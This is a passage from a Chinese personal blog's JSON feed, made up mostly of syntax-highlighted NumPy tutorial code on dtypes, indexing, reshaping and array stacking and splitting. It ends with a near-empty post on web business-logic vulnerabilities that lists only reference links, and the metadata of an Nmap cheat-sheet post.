data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># 代码 2-11</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>df <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>str_<span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"numitems\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>int64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>               <span class=\"token punctuation\">(</span><span class=\"token string\">\"price\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>float64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> df<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\"># 代码 2-12</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> df<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">(</span>df<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># 代码 2-13</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>itemz <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tomatoes\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"cabbages\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.72</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                 dtype<span class=\"token operator\">=</span>df<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'自定义数据为：'</span><span class=\"token punctuation\">,</span> itemz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># 代码 2-14</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token comment\"># 代码 2-15</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\"># 代码 2-16</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>randn<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\"># 代码 2-17</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\"># 代码 2-18</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 用整数作为下标可以获取数组中的某个元素</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\"># 用范围作为下标获取数组的一个切片，包括 arr [3] 不包括 arr [5]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 省略开始下标，表示从 arr [0] 开始</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># 下标可以使用负数，-1 表示从数组后往前数的第一个元素</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>arr<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 下标还可以用来修改元素的值</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token comment\"># 范围中的第三个参数表示步长，2 表示隔一个元素取一个元素</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 步长为负数时，开始下标必须大于结束下标</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token comment\"># 代码 2-19</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 0 行中第 3 和第 4 列的元素</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token comment\"># 索引第 2 和第 3 行中第 3 列、第 4 列和第 5 列的元素</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：\\n'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 2 列的元素</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\"># 代码 2-20</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token comment\"># 从两个序列的对应位置取出两个整数组成下标：arr [0,1], arr [1,2], arr [2,3]</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 2、3 行中第 0、2、3 列的元素</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>mask <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> dtype<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token comment\"># mask 是一个布尔数组，它索引第 1、3 行中第 2 列的元素</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>mask<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># 代码 2-21</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建一维数组</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的一维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'新的一维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 设置数组的形状</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组维度为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ndim<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组维度</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token comment\"># 代码 2-22</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平后为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>ravel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token comment\"># 代码 2-23</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>flatten<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 横向展平</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>flatten<span class=\"token punctuation\">(</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 纵向展平</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token comment\"># 代码 2-24</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>arr1 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组1为：'</span><span class=\"token punctuation\">,</span> arr1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>arr2 <span class=\"token operator\">=</span> arr1 <span class=\"token operator\">*</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组2为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>hstack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hstack 函数横向组合</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># 代码 2-25</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>vstack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># vstack 函数纵向组合</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token comment\"># 代码 2-26</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>concatenate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># concatenate 函数横向组合</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>concatenate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># concatenate 函数纵向组合</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token comment\"># 代码 2-27</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>hsplit<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hsplit 函数横向分割</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre><span class=\"token comment\"># 代码 2-28</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>vsplit<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># vsplit 函数纵向分割</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token comment\"># 代码 2-29</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># split 函数横向分割</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># split 函数纵向分割</span></pre></td></tr></table></figure>",
            "tags": [
                "python",
                "数据分析"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/03/09/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/",
            "url": "https://self-ferry.github.io/2021/03/09/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/",
            "title": "web漏洞-业务逻辑漏洞",
            "date_published": "2021-03-09T08:15:23.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=491097414\"]}]'></div></div>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>又要鸽了 0，有事情要忙。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE5NTgzNy5odG1s\">逻辑漏洞挖掘初步总结篇</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWC1jYWlqaS9wLzExMjA5OTYzLmh0bWw=\">Web 安全测试中常见逻辑漏洞解析（实战篇）</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5OTE2OTIvYXJ0aWNsZS9kZXRhaWxzLzgyOTUzMjEz\">常见逻辑漏洞</span></p>\n<p>挖掘出属于自己思维的逻辑漏洞。</p>\n",
            "tags": []
        },
        {
            "id": "https://self-ferry.github.io/2021/03/09/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/",
            "url": "https://self-ferry.github.io/2021/03/09/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/",
            "title": "Nmap速查手册",
            "date_published": "2021-03-09T08:14:20.000Z",
